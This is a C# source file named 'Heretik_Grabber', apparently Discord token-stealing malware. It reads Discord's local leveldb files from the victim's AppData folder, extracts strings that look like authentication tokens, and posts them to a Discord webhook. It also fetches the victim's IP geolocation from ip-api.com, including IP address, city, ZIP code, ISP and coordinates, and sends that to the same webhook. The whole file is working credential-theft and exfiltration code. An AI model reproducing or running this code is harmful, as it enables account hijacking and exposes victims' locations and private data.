using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using SimpleJSON;
using System.Net;
using System.Net.Http;

namespace Heretik_Grabber
{
    class Program
    {
        public static void Main()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                discordWebhook.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        discordWebhook.sendText($"Discord token: {match.ToString()}");
                    }
                }
            }
            GetLocation();
        }
        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                discordWebhook.sendText("Discord path not found 😢");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }
        public static void GetLocation()
        {
            string url = @"http://ip-api.com/json/";
            
            WebClient client = new WebClient();
            string response = client.DownloadString(url);
            //
            dynamic json = JSON.Parse(response);
            discordWebhook.sendText(
                "\nIP Information:" +
                "\nStatus: " + json["status"] +
                "\nIP: " + json["query"] +
                "\nCountry: " + json["country"] + "[" + json["countryCode"] + "]" +
                "\nCity: " + json["city"] +
                "\nRegion: " + json["regionName"] +
                "\nZIP Code: " + json["zip"] +
                "\nInternet provider: " + json["isp"] +
                "\nLatitude: " + json["lat"] +
                "\nLongitude: " + json["lon"] +
                "\nAS: " + json["as"] +
                "\nTime Zone: " + json["timezone"] +
                "");
        }
    }
}
